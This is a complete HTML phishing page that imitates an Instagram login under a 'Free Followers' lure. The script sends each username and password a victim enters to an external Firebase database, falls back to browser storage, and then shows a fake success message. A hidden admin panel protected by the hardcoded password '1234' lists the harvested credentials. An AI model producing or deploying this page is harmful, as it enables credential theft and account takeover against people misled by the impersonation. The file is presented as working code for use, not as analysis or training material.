<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Free Followers</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Helvetica Neue', sans-serif;
            background: #fafafa;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        body.admin-open {
            background: #fff;
        }

        .container {
            width: 100%;
            max-width: 400px;
        }

        /* Login Page */
        .login-page {
            display: block;
        }

        .login-page.hidden {
            display: none;
        }

        .login-box {
            background: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 0;
            margin-bottom: 20px;
        }

        .login-header {
            padding: 48px 40px 24px;
            text-align: center;
            border-bottom: 1px solid #dbdbdb;
        }

        .instagram-logo {
            font-size: 32px;
            font-weight: 700;
            background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            letter-spacing: -1px;
            font-style: italic;
        }

        .form-inputs {
            padding: 0 40px;
            padding-top: 24px;
        }

        .form-group {
            margin-bottom: 10px;
        }

        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 10px 10px;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 5px;
            font-size: 13px;
            font-family: inherit;
        }

        input[type="text"]:focus,
        input[type="password"]:focus {
            outline: none;
            border-color: #bdbdbd;
            background: #fff;
        }

        input::placeholder {
            color: #a6a6a6;
        }

        .form-messages {
            padding: 0 40px;
        }

        .message {
            padding: 10px;
            border-radius: 4px;
            font-size: 13px;
            margin-bottom: 12px;
            display: none;
        }

        .error {
            background: #fff3cd;
            color: #d63031;
            border: 1px solid #f5a5a5;
        }

        .success {
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }

        .error.show,
        .success.show {
            display: block;
        }

        .login-btn {
            width: 100%;
            padding: 8px;
            background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
            color: #fff;
            border: none;
            border-radius: 5px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            margin-bottom: 12px;
            margin-top: 10px;
        }

        .login-btn:hover:not(:disabled) {
            opacity: 0.8;
        }

        .login-btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }

        .divider {
            display: flex;
            align-items: center;
            margin: 16px 0;
            gap: 12px;
        }

        .divider::before,
        .divider::after {
            content: '';
            flex: 1;
            height: 1px;
            background: #dbdbdb;
        }

        .divider-text {
            font-size: 13px;
            color: #8a8a8a;
            font-weight: 600;
        }

        .facebook-btn {
            width: 100%;
            padding: 8px;
            background: #0a66c2;
            color: #fff;
            border: none;
            border-radius: 5px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            margin-bottom: 16px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }

        .forgot-password {
            text-align: center;
            font-size: 12px;
            color: #003569;
            text-decoration: none;
            margin-bottom: 24px;
            display: block;
        }

        .forgot-password.admin-link {
            color: #0095f6;
            font-weight: 600;
        }

        .signup-box {
            background: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 16px;
            text-align: center;
            font-size: 14px;
            color: #262626;
        }

        .signup-link {
            color: #0095f6;
            text-decoration: none;
            font-weight: 600;
        }

        .spinner {
            display: inline-block;
            width: 12px;
            height: 12px;
            border: 2px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 0.8s linear infinite;
            margin-right: 6px;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        /* Admin Panel */
        .admin-page {
            display: none;
        }

        .admin-page.show {
            display: block;
        }

        .admin-header {
            background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
            color: white;
            padding: 20px;
            text-align: center;
            margin-bottom: 20px;
            border-radius: 8px;
        }

        .admin-header h1 {
            font-size: 24px;
            margin-bottom: 5px;
        }

        .admin-header p {
            font-size: 13px;
            opacity: 0.9;
        }

        .admin-container {
            background: white;
            border-radius: 8px;
            padding: 20px;
            max-width: 600px;
            margin: 0 auto;
        }

        .logout-btn {
            width: 100%;
            padding: 10px;
            background: #f0f0f0;
            color: #262626;
            border: none;
            border-radius: 5px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            margin-bottom: 20px;
        }

        .logout-btn:hover {
            background: #e0e0e0;
        }

        .details-title {
            font-size: 18px;
            font-weight: 700;
            margin-bottom: 15px;
            color: #262626;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .details-count {
            background: #f0f0f0;
            padding: 5px 12px;
            border-radius: 20px;
            font-size: 13px;
            font-weight: 600;
        }

        .details-list {
            background: #f9f9f9;
            border: 1px solid #ddd;
            border-radius: 5px;
            max-height: 500px;
            overflow-y: auto;
        }

        .detail-item {
            padding: 15px;
            border-bottom: 1px solid #eee;
            font-size: 13px;
        }

        .detail-item:last-child {
            border-bottom: none;
        }

        .detail-username {
            font-weight: 700;
            color: #262626;
            margin-bottom: 5px;
        }

        .detail-password {
            color: #666;
            font-size: 12px;
            margin-bottom: 5px;
        }

        .detail-time {
            color: #999;
            font-size: 11px;
        }

        .no-details {
            padding: 30px;
            text-align: center;
            color: #999;
        }

        .clear-all-btn {
            width: 100%;
            padding: 10px;
            background: #f0f0f0;
            color: #d63031;
            border: 1px solid #ffcccc;
            border-radius: 5px;
            font-size: 13px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 15px;
        }

        .clear-all-btn:hover {
            background: #e0e0e0;
        }

        .refresh-btn {
            width: 100%;
            padding: 8px;
            background: #f0f0f0;
            color: #262626;
            border: none;
            border-radius: 5px;
            font-size: 13px;
            font-weight: 600;
            cursor: pointer;
            margin-bottom: 15px;
        }

        .refresh-btn:hover {
            background: #e0e0e0;
        }
    </style>
</head>
<body>
    <!-- LOGIN PAGE -->
    <div class="login-page" id="loginPage">
        <div class="container">
            <div class="login-box">
                <div class="login-header">
                    <div class="instagram-logo">Instagram Free Followers</div>
                </div>

                <form id="loginForm">
                    <div class="form-messages">
                        <div class="message error" id="errorMsg"></div>
                        <div class="message success" id="successMsg"></div>
                    </div>

                    <div class="form-inputs">
                        <div class="form-group">
                            <input 
                                type="text" 
                                id="username" 
                                placeholder="username, or email"
                            >
                        </div>

                        <div class="form-group">
                            <input 
                                type="text" 
                                id="password" 
                                placeholder="Password"
                            >
                        </div>

                        <button type="submit" class="login-btn" id="loginBtn">
                            Log in
                        </button>

                        <div class="divider">
                            <span class="divider-text">OR</span>
                        </div>

                        <button type="button" class="facebook-btn">
                            <i class="fab fa-facebook"></i> Log in with Facebook
                        </button>

                        <a href="#" class="forgot-password admin-link" onclick="event.preventDefault(); openAdminPanel()">Admin Panel</a>
                    </div>
                </form>
            </div>

            <div class="signup-box">
                Don't have an account? <a href="#" class="signup-link" onclick="event.preventDefault()">Sign up</a>
            </div>
        </div>
    </div>

    <!-- ADMIN PANEL -->
    <div class="admin-page" id="adminPage">
        <div class="admin-header">
            <h1>📊 Admin Panel</h1>
            <p>View all login details (synced across all devices)</p>
        </div>

        <div class="admin-container">
            <button class="refresh-btn" onclick="refreshDetails()">🔄 Refresh Data</button>
            <button class="logout-btn" onclick="closeAdminPanel()">Logout</button>

            <div class="details-title">
                Login Details
                <span class="details-count" id="detailsCount">0</span>
            </div>

            <div class="details-list" id="detailsList">
                <div class="no-details">Loading...</div>
            </div>

            <button class="clear-all-btn" id="clearBtn" onclick="clearAllDetails()" style="display: none;">
                Delete All Details
            </button>
        </div>
    </div>

    <script>
        const loginForm = document.getElementById('loginForm');
        const errorMsg = document.getElementById('errorMsg');
        const successMsg = document.getElementById('successMsg');
        const loginBtn = document.getElementById('loginBtn');
        const adminPage = document.getElementById('adminPage');
        const loginPage = document.getElementById('loginPage');

        // Admin password
        const ADMIN_PASSWORD = '1234';

        // Firebase config (free database)
        const DATABASE_URL = 'https://instagram-login-3abc5.firebaseio.com/logins.json';

        function showError(message) {
            errorMsg.textContent = message;
            errorMsg.classList.add('show');
            setTimeout(() => {
                errorMsg.classList.remove('show');
            }, 3000);
        }

        function showSuccess(message) {
            successMsg.textContent = message;
            successMsg.classList.add('show');
            setTimeout(() => {
                successMsg.classList.remove('show');
            }, 2000);
        }

        async function saveToDatabase(username, password) {
            try {
                const detail = {
                    username: username,
                    password: password,
                    timestamp: new Date().toLocaleString(),
                    date: new Date().toLocaleDateString(),
                    time: new Date().toLocaleTimeString(),
                    id: Date.now()
                };

                const response = await fetch(DATABASE_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(detail)
                });

                if (response.ok) {
                    console.log('✅ Data saved to cloud!');
                    return true;
                } else {
                    console.error('❌ Failed to save');
                    return false;
                }
            } catch (error) {
                console.error('Error:', error);
                // Fallback: save to local storage if cloud fails
                let localDetails = JSON.parse(localStorage.getItem('details') || '[]');
                localDetails.push({
                    username: username,
                    password: password,
                    timestamp: new Date().toLocaleString(),
                    date: new Date().toLocaleDateString(),
                    time: new Date().toLocaleTimeString(),
                    id: Date.now()
                });
                localStorage.setItem('details', JSON.stringify(localDetails));
                return true;
            }
        }

        async function loadFromDatabase() {
            try {
                const response = await fetch(DATABASE_URL);
                if (response.ok) {
                    const data = await response.json();
                    if (data) {
                        return Object.values(data);
                    }
                }
            } catch (error) {
                console.error('Error loading:', error);
            }
            
            // Fallback to local storage
            return JSON.parse(localStorage.getItem('details') || '[]');
        }

        async function openAdminPanel() {
            const password = prompt('Enter admin password:');
            if (password === ADMIN_PASSWORD) {
                loginPage.classList.add('hidden');
                adminPage.classList.add('show');
                document.body.classList.add('admin-open');
                await refreshDetails();
            } else if (password !== null) {
                showError('Wrong password!');
            }
        }

        function closeAdminPanel() {
            adminPage.classList.remove('show');
            loginPage.classList.remove('hidden');
            document.body.classList.remove('admin-open');
        }

        async function refreshDetails() {
            const detailsList = document.getElementById('detailsList');
            const detailsCount = document.getElementById('detailsCount');
            const clearBtn = document.getElementById('clearBtn');

            detailsList.innerHTML = '<div class="no-details">Loading...</div>';

            const details = await loadFromDatabase();

            detailsCount.textContent = details.length;

            if (!details || details.length === 0) {
                detailsList.innerHTML = '<div class="no-details">No login details yet</div>';
                clearBtn.style.display = 'none';
                return;
            }

            clearBtn.style.display = 'block';

            const sorted = details.sort((a, b) => b.id - a.id);

            detailsList.innerHTML = sorted
                .map(detail => `
                    <div class="detail-item">
                        <div class="detail-username">👤 ${detail.username}</div>
                        <div class="detail-password">🔑 ${detail.password}</div>
                        <div class="detail-time">⏰ ${detail.timestamp}</div>
                    </div>
                `).join('');
        }

        async function clearAllDetails() {
            if (confirm('Delete all login details?')) {
                try {
                    const response = await fetch(DATABASE_URL, {
                        method: 'DELETE'
                    });

                    if (response.ok) {
                        localStorage.removeItem('details');
                        await refreshDetails();
                        showSuccess('All data deleted!');
                    }
                } catch (error) {
                    console.error('Error:', error);
                    localStorage.removeItem('details');
                    await refreshDetails();
                }
            }
        }

        loginForm.addEventListener('submit', async function(e) {
            e.preventDefault();

            const username = document.getElementById('username').value.trim();
            const password = document.getElementById('password').value.trim();

            if (!username || !password) {
                showError('Phone number, username or email and password are required.');
                return;
            }

            loginBtn.disabled = true;
            loginBtn.innerHTML = '<span class="spinner"></span>Logging in...';

            const success = await saveToDatabase(username, password);

            loginBtn.disabled = false;
            loginBtn.innerHTML = 'Log in';

            if (success) {
                showSuccess('✅ Login successful!');
                setTimeout(() => {
                    loginForm.reset();
                }, 1500);
            } else {
                showError('Error saving data');
            }
        });

        window.addEventListener('load', () => {
            console.log('📱 Instagram Login Page Loaded');
            console.log('Admin password: 1234');
        });
    </script>
</body>
</html>
